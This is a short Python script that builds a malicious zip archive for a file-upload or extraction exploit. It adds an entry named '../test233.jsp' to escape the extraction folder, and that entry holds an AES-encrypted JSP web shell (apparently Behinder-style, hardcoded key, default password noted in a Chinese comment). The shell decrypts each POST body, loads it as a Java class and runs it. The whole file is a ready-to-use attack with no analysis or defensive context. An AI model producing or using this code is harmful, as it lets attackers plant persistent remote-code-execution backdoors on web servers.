
import zipfile

shell_name = 'test233.jsp'
shell_name_zip = '../' + shell_name
zip_file_name = "TEST233.zip"
shell_content = r'<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'

def make_zip_file():
    zf = zipfile.ZipFile(zip_file_name, mode='a', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(shell_name_zip, shell_content)

make_zip_file()